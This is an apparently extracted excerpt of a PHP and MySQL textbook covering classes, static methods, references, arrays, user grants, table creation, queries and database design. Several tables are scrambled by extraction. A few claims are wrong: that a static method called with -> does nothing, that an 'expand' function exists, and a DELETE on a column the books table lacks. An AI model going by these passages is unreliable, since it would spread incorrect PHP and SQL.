Larger Text,Smaller Text,Symbol
Inheritance,"When declaring classes, it’s also possible to separate functionality into subclasses 
 that automatically inherit the methods and variables of the class on which they are 
 based. This can be useful if you’re adding functionality to a class without modifying 
 the original class. Example 5-17 demonstrates how properties and methods are 
 inherited from the parent class for the
  Domestic_Cat
  class.
  
 The extends operator
  
 When a class inherits from another class, the class from which it inherits is called 
 the 
 superclass
 . When declaring a subclass, use the
  extends
  keyword to specify from 
 which class it’s inheriting. Example 5-17 shows an example of this.
  
 Example 5-17. Using the extends keyword to define a subclass
  
 <?php 
  
 class Cat {
  
  
  // How old the cat is
  
  
  var $age;
  
  function Cat($new_age){
  
  
  // Set the age of this cat to the new age
  
  
  $this->age = $new_age;
  
  }
  
  function Birthday( ){
  
  
  
  $this->age++;
  
  
  } 
  
 } 
  
 class Domestic_Cat extends Cat {
  
  
  // Constructor
  
  
  function Domestic_Cat( ) {
  
  
  }
  
  
  // Sleep like a domestic cat
  
  
  function sleep( ) {
  
  
  
  echo(""Zzzzzz.<br />"");
  
  
  } 
  
 } 
  
 $fluffy=new Domestic_Cat( ); 
  
 $fluffy->Birthday( ); 
  
 $fluffy->sleep( ); 
  
 echo ""Age is $fluffy->age <br />""; 
  
 ?>
  
 Object-Oriented Programming
  
 | 101",NA
Static Methods and Variables,"Methods and variables can also be used and accessed if they are defined as static in 
 a class. As Chapter 3 noted,
  static
  means the method or variable is accessible 
 through the class definition and not just through objects. In PHP 4.0, there is no 
 way to des-ignate a variable to be static; however, in PHP 5.0, you can use the
  static
  
 modifier.
  
 The
  ::
  operator allows you to refer to variables and methods on a class that doesn’t 
 yet have any instances or objects created for it. Example 5-20 shows how you can 
 call a static method using
  ::
 , and how the usual method-calling syntax of
  ->
  doesn’t 
 work, even after an instance of the class has been created. (PHP doesn’t report an 
 error—it just doesn’t work.)
  
 Example 5-20. Using the -> and :: operators to call hypnotize
  
 <?php
  
  class Cat {
  
  }
  
 class Hypnotic_Cat extends Cat {
  
  // Constructor
  
  function Hypnotic_Cat( ) {
  
  }
  
  // This function must be called statically
  
  public static function hypnotize( ) {
  
 echo (""The cat was hypnotized."");
  
  
  
  return;
  
  
  } 
  
 }
  
 // Hypnotize all cats 
  
 Hypnotic_Cat::hypnotize( );
  
 $hypnotic_cat = new Hypnotic_Cat( ); 
  
 // Does nothing 
  
 $hypnotic_cat->hypnotize( );
  
 The output is as follows:
  
 The cat was hypnotized.
  
 When a method is called using the scope resolution operator (
 ::
 ), you can’t use the 
 $this
  object to refer to the object because there is no object.
  
 104
  
 |
  
 Chapter 5: Functions",NA
Variable References,"In PHP, a variable name points to a location in memory that stores the data. There 
 can be more than one variable name pointing to the same spot in memory. The 
 ampersand operator (
 &
 ) is used to indicate that you’re interested in the location in 
 memory that a variable points to instead of its value.
  
 PHP references allow you to create two variables to refer to the same content. 
 There-fore, changing the value of one variable can change the value of another. This 
 can make it very difficult to find errors in your code, since changing one variable 
 also changes the other.
  
 The same syntax can be used with functions that return references. Example 5-21 
 uses this to reference the
  $some
  variable.
  
 Example 5-21. Referencing the $some_variable
  
 <?php 
  
 $some_variable = ""Hello World!""; 
  
 $some_reference = &$some_variable; 
  
 $some_reference = ""Guten Tag World!""; 
  
 echo $some_variable; 
  
 echo $some_reference; 
  
 ?>
  
 Example 5-21 outputs the following:
  
 Guten Tag World!Guten Tag World!
  
 Example 5-21 shows that a reference is set using the
  &
  operator and precedes the
  $
  
 in the existing variable. The variable
  $some_reference
  then refers to
  $some_variable
  
 (the memory location where
  ""Hello World!""
  resides).
  
 As discussed previously in this chapter, variable references are useful for passing a 
 variable by reference as a parameter to a function. This allows the function to mod-
 ify the variable in your main code instead of modifying a local copy that’s lost when 
 the function completes.
  
 Assigning a variable to another variable without using the reference operator 
 results in a copy of the variable being placed into a new location in memory. The 
 new vari-able can be changed without modifying the original variable. While this 
 takes more memory, it’s the way to go if you don’t want to change the original 
 variable’s value.
  
 Now that you’ve learned about functions and classes, you’re ready to start working 
 with more complex data, such as arrays. Arrays will be very useful when working 
 with data from a database because they can easily hold the data from a query.
  
 Object-Oriented Programming
  
 | 105",NA
Chapter 5 Questions,"Question 5-1 
  
  
 What’s wrong with this function call?
  
 <?php
  
 // define a function 
  
 function Response {
  
  
  echo ""Have a good day!<br /><br />""; 
  
 }
  
 // driving to work 
  
 echo ""Are you going to merge? <br />""; 
  
 Response;
  
 // at the office 
  
 echo ""I need a status report on all your projects in the next 10 minutes for 
  
 my management meeting.<br />""; 
  
 Response;
  
 // at the pub after work 
  
 echo ""Did Bill get everything he needed today? He was sure crabby!<br />""; 
  
 Response; 
  
 ?>
  
 Question 5-2 
  
 Define a function called
  toast
  that takes
  minutes
  as a parameter. The function 
 prints “done.”
  
 Question 5-3 
  
  
 Call the
  toast
  function with
  5
  as a parameter.
  
 Question 5-4 
  
  
 What’s the difference between using
  include( )
  and
  require( )
 ?
  
 Question 5-5 
  
  
 What is a function called when it is part of a class?
  
 See the “Chapter 5” section in the Appendix for the answers to these questions.
  
 106
  
 |
  
 Chapter 5: Functions",NA
CHAPTER 6,NA,NA
Arrays,"6
  
 Variables are great for storing a single piece of information, but what happens 
 when you need to store data for a whole set of information, such as the results of a 
 query? When this happens, use
  arrays
 . Arrays are a special kind of variable that 
 stores many pieces of data. Arrays allow you to access any of the values stored in 
 them individu-ally yet still copy and manipulate the array as a whole. Because they 
 are so useful, you’ll see arrays used frequently. PHP provides many functions for 
 performing com-mon array tasks such as counting, sorting, and looping through the 
 data.",NA
Array Fundamentals,"To work with arrays, you need to learn two new terms: elements and indexes. 
 Elements
  are the values that are stored in the array. Each element in the array is 
 refer-enced by an
  index
  that differentiates the element from any other unique 
 element in the array. The index value can be a number or a string, but it must be 
 unique. You can think of an array like a spreadsheet or a database that has only two 
 columns. The first column uniquely identifies the row in the spreadsheet, while the 
 second column contains a stored value.",NA
Associative Versus Numeric Indexed Arrays,"Numeric
  arrays use numbers as their indexes, while
  associative
  arrays use stings. 
 When using associative arrays, you must supply an index string each time you add 
 an element. Numeric arrays allow you to just add the element, and PHP automati-
 cally assigns the first free number, starting at 0. Both types of arrays allow you to 
 add new elements to the array one at a time. Associative arrays are nice for storing 
 config-uration data since their keys can have a meaningful name.
  
  
 Be careful: most people tend to start counting at 1, not 0. If you’re 
 not careful, you might end up being off by one when accessing your 
 array, which is called an
  off-by-one error
 . The last element in a 
 numeric array
  
 is accessed as the length of the array minus 1.
  
 107",NA
Creating an Array,"To create an array, you must specify the elements and index values. In Table 6-2, 
 we show a sample associative array that uses household objects and relates them 
 to strings that describe their shapes.
  
 Table 6-2. An associative array that relates objects to their shapes
  
 Key
  
  
 Value
  
 Soda 
 can 
  
 Notepad 
  
 Apple 
  
 Orange 
  
 Phone 
 book
  
 Cylind
 er 
  
 Rectan
 gle 
  
 Sphere 
  
 Sphere 
  
 Rectan
 gle
  
 The elements of an array can be anything, including strings, numbers, and even 
 other arrays. The key field must be a
  scalar
 . Scalar values are simple values such as 
 a num-ber, text, or Boolean value, not data that can have more than one value such 
 as an array or an object. The key field of an array must also be unique for each 
 element; otherwise you may overwrite the same value. Should you attempt to 
 assign a value using a key you specified already, the new value simply replaces the 
 old value.
  
 108
  
 |
  
 Chapter 6: Arrays",NA
Multidimensional Arrays,"While we’ve shown only arrays that hold simple values like strings so far, 
 remember that an array can also store another array as an element. 
 Multidimensional arrays exploit the fact that an array can have another array as an 
 element. Each set of keys and values represents a
  dimension
 . Multidimensional 
 arrays have a key and value set for each dimension. Don’t worry if that sounds 
 complicated; again, it’s really just an array inside of an array, like those Russian 
 matryoshka dolls that open up to contain yet another smaller doll.
  
 Expanding on your
  shapes
  array, we’ve created a new associative array called 
 $objects
  with keys that are the names of the objects. Each element of the
  $objects 
 array is another associative array containing the keys
  shape
 ,
  color
 , and
  material
  with 
 the associated values as the elements. Table 6-4 shows you what data is being 
 stored.
  
 Table 6-4. A multidimensional array that now stores shape, color, and material for each object
  
 First key
  
  
 Second key
  
 Value
  
 Soda can
  
 Shape
  
 Cylinder
  
 Notepad
  
 Color
  
 Red
  
 Material
  
 Metal
  
 Shape
  
 Rectangle
  
 Apple
  
 Color
  
 White
  
 Material
  
 Paper
  
 Shape
  
 Sphere
  
 Orange
  
 Color
  
 Red
  
 Material
  
 Fruit
  
 Shape
  
 Sphere
  
 Phonebook
  
 Color
  
 Orange
  
 Material
  
 Fruit
  
 Shape
  
 Rectangle
  
 Color
  
 Yellow
  
 Material
  
 Paper
  
 114
  
 |
  
 Chapter 6: Arrays",NA
Extracting Variables from an Array,"PHP provides a shortcut for placing elements in an array into variables in which the 
 variables have the same names as the keys. This works for associative arrays only, 
 unless you specify a prefix that we’ll talk about next. The
  extract
  function takes an 
 array as a parameter and creates the local variables, as shown in Example 6-9.
  
 Example 6-9. Using extract on an associative array
  
 <?php 
  
 $shapes = array('Sodacan' => 'Cylinder',
  
  
  'Notepad' => 'Rectangle',
  
  
  'Apple' => 'Sphere',
  
  
  'Orange' => 'Sphere',
  
  
  'Phonebook' => 'Rectangle');
  
 extract($shapes); 
  
 // $Sodacan, $Notepad, $Apple, $Orange, and $Phonebook are now set 
  
 echo $Apple; 
  
 echo ""<br />""; 
  
 echo $Notepad; 
  
 ?>
  
 Example 6-9 produces browser output like that shown in Figure 6-2.
  
  
 Figure 6-2. The values from the array now appear in their own variables
  
 Notice that the spaces were removed from the key values in the
  $shapes
  array. 
 Although they wouldn’t have caused an error, they also wouldn’t be accessible as 
 variables, since variable names can’t have spaces. You need to use underscores 
 instead of spaces in variable names. Also, if a variable already exists with the same 
 name as a key in the array you want to expand, its value is overwritten by the value 
 from the expanded array.
  
 To prevent overwriting a variable, the
  expand
  function can automatically place a 
 des-ignated string followed by an underscore character before the variable name. 
 An underscore is automatically used to separate the key name from the prefix in 
 the assigned variable names. It’s specified using this syntax:
  
 expand($
 array
 ,EXTR_PREFIX_ALL,""
 the prefix
 "");
  
 Array Fundamentals
  
 | 117",NA
Array Functions in PHP,"Although we’ve already discussed several array functions, such as
  count
 , there are 
 many more. Following are some of the most common ones that we haven’t dis-
 cussed yet; a full listing can be found by searching
  http://www.php.net
 .
  
 Reset(
 array
 ) 
  
 Takes an array as its argument and resets the pointer to the beginning of the 
 array. The
  pointer
  is how PHP keeps track of the current element in an array 
 when working with functions that can move around in arrays. The value of the 
 first element is also returned.
  
 Array_push(
 array,elements
 ) 
  
 Adds one or more elements to the end of an existing array. For example,
  array_ 
 push($shapes,""rock"",""paper"",""scissors"");
  adds those three elements to an array 
 called
  $shapes
 .
  
 Array Fundamentals
  
 | 119",NA
Chapter 6 Questions,"Question 6-1 
  
  
 Where is the first element in a numeric 
 array?
  
 Question 6-2 
  
  
 Create a numeric array called
  $months
  that contains the months of the 
 year.
  
 Question 6-3 
  
 Use
  array( )
  to create an associative array of months and the number of days in 
 each month.
  
 Question 6-4 
  
  
 Display the
  $months
  array.
  
 See the “Chapter 6” section in the Appendix for the answers to these questions.
  
 Chapter 6 Questions
  
 | 121",NA
CHAPTER 7,NA,NA
Working with MySQL ,"7
  
 It’s time to learn how to connect to the MySQL database using the client tools that 
 come with MySQL. You may also use a web-based tool called phpMyAdmin to mod-
 ify your database. We’ll also cover how to use SQL to create databases, users, and 
 tables, as well as how to modify existing objects in the database.",NA
MySQL Database,"MySQL has its own client interface, allowing you to move data around and change 
 database configuration. Note that you should use a password to log in. Assigning 
 database
  users
  allows you to limit access to tables based on the logged-in database 
 user. Each MySQL server can host many databases. A web application may use its 
 own proprietary database or a standard database like MySQL.
  
 You may have installed MySQL yourself or have access to it through your ISP. Most 
 ISPs that support PHP also provide a MySQL database for your use. Should you 
 have difficulty, check their support pages or contact them to determine connection 
 details.
  
 You’ll need to know the following:
  
 • The IP address of the database server
  
 • The name of the database
  
 • The username
  
 • The password
  
 If you’ve installed MySQL on your computer, you’ll be able to use the defaults from 
 the installation and the password you specified. This chapter looks at two ways to 
 communicate with MySQL: the command line and phpMyAdmin.
  
 122",NA
Accessing the Database from the Command Line,"One way of communicating with MySQL is through the MySQL command-line cli-
 ent. Depending on which operating system you’re using, you need to either open a 
 command shell for Windows (type
  cmd
  from the Run dialog, as shown in Figure 7-
 1) or open a terminal session in Mac OS X and Unix environments.
  
  
 Figure 7-1. Windows Run dialog
  
 Once you reach the command line, type
  mysql
 , and press Enter. The syntax for the 
 mysql
  command is:
  
 mysql -h
  hostname
  -u
  user
  –p
  
 The default username is
  root
  if you’ve installed MySQL on your own computer. You 
 can omit the hostname flag and value. Enter your password when MySQL displays 
 the “Enter password” prompt. If the password, username, and hostname are 
 correct, you’ll see a banner message like that shown in Figure 7-2.
  
  
 Figure 7-2. A successful login to MySQL
  
  
 On a brand-new MySQL install, the password is blank.
  
 Don’t let the MySQL command-line interface alarm you; it’s not difficult to use.
  
 MySQL Database
  
 | 123",NA
Managing the Database,"Now that you’re connected to the database, you can create users, databases, and 
 tables. You may not need to create a database or user account if you’re using a 
 MySQL server in a hosted environment, and they supplied you with a username and 
 database name.",NA
Creating Users,"To create users above and beyond the default privileged
  root
  user, issue the
  grant 
 command. The
  grant
  command uses this syntax:
  
 GRANT
  PRIVILEGES
  ON
  DATABASE.OBJECTS
  TO'
 username
 '@'
 hostname
 ' IDENTIFIED BY 
  
 '
 password
 ';
  
 For example:
  
 GRANT ALL PRIVILEGES ON *.* TO 'michele'@'localhost' IDENTIFIED BY 'secret';
  
 This creates the user
  michele
  who can access anything locally. To change to the 
 michele
  user, at the
  mysql
  command prompt, type:
  
 exit
  
 Then start MySQL from the command line with the new username and password. 
 The syntax for specifying the username and password when starting MySQL is:
  
 mysql -h
  hostname
  -u
  username
  -p
 password
  
 Notice that there is no space between
  –p
  and
  password
 . MySQL can prompt for the 
 password if you just specify the
  –p
  flag without a password. If you don’t want users 
 to access tables other than their own, replace
  *
  in the
  GRANT ALL PRIVILEGES ON *.* 
 TO 'michele'
  code with the name of the user’s database, like this:
  
 GRANT ALL PRIVILEGES ON store.* TO 'michele'@'localhost' IDENTIFIED BY 'secret';
  
 You’ll need to run this line as
  root
  or as someone with permission. In this code, the 
 word
  store
  correlates to the database name where privileges are assigned, which 
 you’ll create in the next section.
  
 Managing the Database
  
 | 125",NA
Creating a MySQL Database,"You’re going to create a database called
  store
 . The
  CREATE DATABASE
  command 
 works like this:
  
 CREATE DATABASE store;
  
 If this works, you’ll get a result like this one:
  
 Query OK, 1 row affected (0.03 sec)
  
  
 Database names cannot contain any spaces. On Unix servers, such as 
 Linux and Mac OS X, database names are also case-sensitive.
  
 To start using this database, type:
  
 USE store;
  
 You will get the result:
  
 Database changed.
  
 Assuming you’ve done everything correctly, you’ll be set up with new data, and it 
 will be selected for use. Creating tables to hold data is an important concept, so 
 that’s where we’re headed!",NA
Using phpMyAdmin,"The tool phpMyAdmin, available from
  http://www.phpmyadmin.net/
 , allows you to 
 administer a MySQL database through your web browser. All that’s required is a 
 web server with PHP installed and a MySQL database to administer.
  
 To install phpMyAdmin, follow these steps:
  
 1. Click Downloads from the main page.
  
 2. Download the archive file, such as
  all-languages.tar.gz
  (Unix archived) or
  all-
 languages.zip
  (Windows ZIP format).
  
 3. Unpack the archive (including subdirectories) to a directory on your computer.
  
 4. Transfer them to your ISP account where PHP files can be executed. Or, if you 
 have a web server installed locally, transfer them to a directory in the 
 document root with a logical name such as
  myadmin
 .
  
 5. To configure phpMyAdmin, create a directory called
  config
  within the
  myadmin 
 directory. On Linux systems, execute these commands instead to create the 
 directory, and set the permissions to allow the setup program to modify the 
 con-figuration file:
  
 126
  
 |
  
 Chapter 7: Working with MySQL",NA
Database Concepts,"Databases are a repository for information. They excel at managing and manipulat-
 ing structured information.
  Structured information
  is a way to organize related 
 pieces of information, which we discussed previously in Chapters 3–6. The basic 
 types of structured information, which can also be called
  data structures
 , include:
  
 • Files
  
 • Lists
  
 • Arrays
  
 • Records
  
 • Trees
  
 • Tables
  
 Database Concepts
  
 | 131",NA
Structured Query Language,"Now that you’ve defined a table, you can add data to it. MySQL will keep track of all 
 the details. To manipulate data, use the Structured Query Language (SQL) com-
 mands. Because it’s been designed to easily describe the relationship between 
 tables and rows, the database uses SQL to modify data in tables.
  
 SQL is a standard language used with most databases such as MySQL, Oracle, or 
 Microsoft SQL Server. It was developed specifically as a language used to retrieve, 
 add, and manipulate data that resides in databases. We’ll get into the nitty-gritty of 
 MySQL in Chapter 8, but we’ll begin with some easy-to-use commands. We’re going 
 to start with creating tables.
  
 132
  
 |
  
 Chapter 7: Working with MySQL",NA
Creating Tables,"Use the
  create table
  command to specify the structure of new database tables. When 
 you create a database table, each column has a few options in addition to the 
 column names and data types. Values that must be supplied when adding data to a 
 table are specified using the
  NOT NULL
  keyword. The
  PRIMARY KEY
  keyword tells 
 MySQL which column to use as a key field. Then, you have MySQL automatically 
 assign key values using the
  AUTO_INCREMENT
  keyword.
  
 To create these tables, type or paste the code into the MySQL command-line client. 
 Chapter 8 contains important information if you’re interested in running the SQL 
 code in the following examples. It explains how to access the MySQL client, assign 
 security permissions using the
  GRANT
  command, create a database, and select it for 
 use.
  
 Example 7-1 creates the
  books
  table using the data types from Table 7-8.
  
 Example 7-1. Creating the books and authors tables
  
 CREATE TABLE books ( 
  
 title_id INT NOT NULL AUTO_INCREMENT, 
  
 title VARCHAR (150), 
  
 pages INT, 
  
 PRIMARY KEY (title_id));
  
 CREATE TABLE authors ( 
  
 author_id INT NOT NULL 
 AUTO_INCREMENT, 
  
 title_id INT NOT NULL, 
  
 author VARCHAR (125), 
  
 PRIMARY KEY (author_id));
  
 If everything is OK, you’ll see output that instructs MySQL to create a table 
 called“books,” and it’ll look like Example 7-2 (the time the query takes to run may 
 be dif-ferent than 0.06 sec):
  
 Example 7-2. Creating Sample Data
  
 mysql> CREATE TABLE books (
  
  
  -> title_id INT NOT NULL AUTO_INCREMENT,
  
  
  -> title VARCHAR (150),
  
  
  -> pages INT,
  
  
  -> PRIMARY KEY (title_id)); 
  
 Query OK, 0 rows affected (0.06 sec)
  
 Structured Query Language
  
 | 133",NA
Adding Data to a Table,"The
  INSERT
  command is used to add data. Its syntax is
  INSERT INTO
  table
  COLUMNS 
 (
 [columns]
 ) VALUES (
 [values]
 );
 . This syntax displays which table data needs to be 
 added to, the columns, and a list of the values. If the columns aren’t specified, the 
 values must be in the same order in which they were defined when the table was 
 cre-ated (as long as you don’t skip any column values). There are specific rules for 
 how you handle data to populate your database using SQL commands:
  
 • Numeric values shouldn’t be quoted.
  
 • String values should always be quoted.
  
 • Date and time values should always be quoted.
  
 • Functions shouldn’t be quoted.
  
 •
  NULL
  should never be quoted.
  
 Lastly, if a column isn’t given a value, it’s automatically considered
  NULL
  unless a 
 default exists for the column. If a column can’t have
  NULL
  (it was created with
  NOT 
 NULL
 ) and you don’t specify a value, an error occurs.
  
 For example:
  
 INSERT INTO books VALUES (1,""Linux in a Nutshell"",112); 
  
 INSERT INTO authors VALUES (NULL,1,""Ellen Siever""); 
  
 INSERT INTO authors VALUES (NULL,1,""Aaron Weber"");
  
 As long as there were no errors, you should get:
  
 mysql> INSERT INTO books VALUES (1,""Linux in a Nutshell"",112); 
  
 Query OK, 1 row affected (0.00 sec)
  
 mysql> INSERT INTO authors VALUES (NULL,1,""Ellen Siever""); 
  
 Query OK, 1 row affected (0.00 sec)
  
 mysql> INSERT INTO authors VALUES (NULL,1,""Aaron Weber""); 
  
 Query OK, 1 row affected (0.00 sec)
  
 When adding data, you must specify all the columns even if you aren’t supplying a 
 value for each one. Even though we didn’t supply the
  author_id
  field and we let 
 MySQL assign it for us, we still had to leave a placeholder for it.
  
 Likewise, we add the other book:
  
 INSERT INTO books VALUES (2,""Classic Shell Scripting"",256); 
  
 INSERT INTO authors VALUES (NULL,2,""Arnold Robbins""); 
  
 INSERT INTO authors VALUES (NULL,2,""Nelson Beebe"");
  
 Structured Query Language
  
 | 135",NA
Table Definition Manipulation,"Once you’ve created a table and started storing information in it, you may find that 
 you need to make a change to the column types. For example, you may find that a 
 field you thought would need only 30 characters actually needs 100. You could 
 start all over and redefine the table, but you’d lose all your data. Thankfully, MySQL 
 allows you to modify column types without losing your data. These examples 
 assume that you’ve created the database tables in this chapter.
  
 Renaming a table
  
 To rename a table, use
  ALTER TABLE
  table
  RENAME
  newtable
 . In this example, we are 
 renaming the table from
  books
  to
  publications
 :
  
 ALTER TABLE books RENAME publications;
  
 This would look like Figure 7-10.
  
  
 Figure 7-10. Renaming a table
  
 Changing a column’s data type
  
 To change a column data type, use
  ALTER TABLE
  table
  MODIFY
  column datatype
 . The 
 fol-lowing syntax modifies the
  author
  field so that the column can take 150 
 characters:
  
 ALTER TABLE authors MODIFY author VARCHAR(150);
  
 Changing a column’s data type will look like Figure 7-11.
  
  
 Figure 7-11. Changing a column’s data type
  
 136
  
 |
  
 Chapter 7: Working with MySQL",NA
Querying the Database,"Having data in tables doesn’t do much good if you can’t view what’s in them. The 
 SELECT
  command specifies which table(s) to query and which row(s) to view based 
 on specific conditions. The syntax of
  SELECT
  is
  SELECT
  columns
  FROM
  tables
  [WHERE 
 CLAUSE
 ];[ORDER BY CLAUSE];
 .
  
 Columns indicate a list of columns to display from the selected tables. The
  WHERE 
 clause optionally restricts which rows are selected.
  WHERE
  provides limits to the 
 results that are returned from a query. For example, rows can be rejected if a field 
 doesn’t equal a literal value or is less than or greater than a value. The
  ORDER BY
  
 clause allows you to sort the returned information in desired ways. Fields from 
 multiple tables can be forced to be equal. If multiple tables are included in a
  SELECT
  
 statement without a
  WHERE
  clause, the resulting set becomes the
  Cartesian
  
 product, in which every row in the first table is returned with all rows in the second 
 table, followed by the same thing for the second row in the first table. To put it 
 another way, that’s a lot of results!
  
 The simplest query is to view all columns in a table by using the asterisk (
 *
 ) 
 character:
  
 138
  
 |
  
 Chapter 7: Working with MySQL",NA
Modifying Database Data,"If you make a mistake, say, by entering the wrong number of pages for a book, you 
 can change the data by using the
  UPDATE
  command. There are many other reasons 
 to update a table, such as a user changing his password.
  
 UPDATE
  uses the same
  WHERE
  clause as the
  SELECT
  statement, but it adds a
  SET
  com-
 mand that specifies a new column value.
  
  
 If you forget to select the
  WHERE
  clause for an update, it changes 
 every record in the table.
  
 142
  
 |
  
 Chapter 7: Working with MySQL",NA
Deleting Database Data,"The
  DELETE
  command is used to delete rows or records in a table. It takes the same 
 WHERE
  clause as
  UPDATE
  but deletes any rows that match. Without the
  WHERE
  
 clause, you’d have an “oops!” moment because all the records in the table would be 
 deleted.
  
  
 You should really have a backup of your data when you are using 
 DELETE
 ; otherwise, all data could be lost, and you may be very 
 unhappy.
  
 In this example, only Ellen Siever’s book is deleted from the database:
  
 DELETE FROM books WHERE author_id = 1;",NA
Search Functions,"As you have seen in the previous examples, MySQL has the ability to find specific 
 search data. However, we have not covered the general search syntax. The percent-
 age (
 %
 ) character in MySQL is the wildcard character and is used with the
  LIKE
  key-
 word. That is, it can literally represent anything. This is like a Windows Explorer 
 search where searching for
  *.doc
  matches any document that ends with
  .doc
 . 
 Searches are case-insensitive by default.
  
 For example, to do a general search, you would use the following syntax:
  
 SELECT * FROM authors WHERE author LIKE ""%b%"";
  
 Structured Query Language
  
 | 143",NA
Logical Operators,"The same logical operators that we discussed with PHP’s conditional logic can also 
 be used in the
  WHERE
  clause.
  
 You can use
  AND
 ,
  OR
 , and
  NOT
  in your query’s
  WHERE
  clause:
  
 SELECT * FROM authors WHERE NOT (author = ""Ellen Siever"" );
  
 This returns all records where Ellen Siever is not the author. The parentheses relate 
 the
  NOT
  operator to the author comparison but are not required in this query.
  
 This query returns book and author information from the following code:
  
 SELECT *
  
  FROM books, authors
  
  WHERE title = ""Linux in a Nutshell""
  
   
  AND author = ""Aaron Weber""
  
   
  AND books.title_id = authors.title_id;
  
 This query returns all records with author names of either Aaron Weber or Ellen 
 Siever:
  
 SELECT *
  
  FROM books, authors
  
  WHERE (author = ""Aaron Weber""
  
    
  OR  author = ""Ellen Siever"")
  
   
  AND books.title_id=authors.title_id
  
 144
  
 |
  
 Chapter 7: Working with MySQL",NA
Chapter 7 Questions,"Question 7-1 
  
 What command is used to access MySQL from the command line (assuming the 
 MySQL bin directory is included in your path)?
  
 Question 7-2 
  
 Create a table called
  months
  that contains the month name and the number of 
 days in the month.
  
 Question 7-3 
  
  
 Write
  insert
  statements to populate the months and days.
  
 Question 7-4 
  
  
 Write a
  select
  statement to display the months.
  
 Question 7-5 
  
  
 Write a
  select
  statement to display the month that has only 28 days.
  
 Question 7-6 
  
  
 Write a query to display only the months that end in “ber.”
  
 See the “Chapter 7” section in the Appendix for the answers to these questions.
  
 Chapter 7 Questions
  
 | 145",NA
CHAPTER 8,NA,NA
Database Best Practices ,"8
  
 Now that you have MySQL up and running and have created a database, let’s talk 
 about database design and backing up your databases. As you know, backing up 
 your data is important. Adding MySQL to PHP and combining the applications for 
 your dynamic web site is a great start. But it helps tremendously to structure your 
 database correctly. If you have security, data integrity, and backups, you have the 
 most crucial pieces of a database. We’ll discuss security in Chapter 15.",NA
Database Design,"Designing your database properly is critical to your application performing well. 
 Just as putting the printer all the way across your office is inefficient, placing data in 
 poor relationships makes work less efficient because your database server will 
 waste time looking for data. When thinking about your database, think about what 
 kinds of questions will be asked when your database is used. For example, what are 
 the details about a product for sale? Or, is this a valid username and password?",NA
Relational Databases,"MySQL is a
  relational
  database. An important feature of relational systems is that 
 data can be spread across several tables, as opposed to our flat-file phone book 
 example. Related data is stored in separate tables and allows you to put them 
 together by using a key common to both tables. The
  key
  is the relation between the 
 tables. The selection of a
  primary key
  is one of the most critical decisions you’ll 
 make in designing a new database.
  
 The most important concept that you need to understand is that you must ensure 
 that the selected key is unique. If it’s possible that two records (past, present, or 
 future) share the same value for an attribute, don’t use that attribute as a primary 
 key. Including key fields from another table to form a link between tables is called a 
 foreign key
  relationship, like a boss to employees or a user to a purchase.
  
 146",NA
Relationship Types,"Databases relationships are quantified with the following categories:
  
 • One-to-one relationships
  
 • One-to-many relationships
  
 • Many-to-many relationships
  
 We’ll discuss each of these relationships and provide an example. If you think of a 
 family structure when thinking about relationships, you’re ahead of the game. 
 When you spend time alone with one parent, that’s a specific type of relationship; 
 when you spend time with both your parents, that’s another one. If you bring in a 
 signifi-cant partner and all of you—your parents, you, and your partner—do 
 something together, that’s another relationship. This is identical to the bucket 
 analogy. All those different types of relationships are like specific buckets that hold 
 the dynamics of your relationships. In the database world, this is the data you’ve 
 created.
  
 One-to-one relationships
  
 In a one-to-one relationship, each item is related to one and only one other item. 
 Within the example of an online bookstore, a one-to-one relationship exists 
 between users and their shipping addresses. Each user must have exactly one 
 shipping address. The key symbol in each figure represents the field that’s the key 
 for the table, as shown in Figure 8-1.
  
  
  
 users
  
 Relations
 hip 1–1
  
 ship
  
 Us
 er 
  
 Fir
 st 
  
 La
 st
  
 User 
  
 Addres
 s 
  
 City 
  
 State 
  
 Zip
  
  
 Figure 8-1. A one-to-one relationship between users and shipping addresses
  
 In Figure 8-2, you see that the user
  mdavis
  has one and only one address, as do the 
 users
  jphillips
  and
  sque
 .
  
 Database Design
  
 | 147",NA
Normalization,"Thinking about how your data is related and the most efficient way to organize it is 
 called
  normalization
 . Normalization of data is breaking it apart based on the logical 
 relationships to minimize the duplication of data. Generally, duplicated data wastes 
 space and makes maintenance a problem. Should you change information that is 
 duplicated, there’s the chance that you miss a portion and risk inconsistencies in 
 your database.
  
 Database Design
  
 | 149",NA
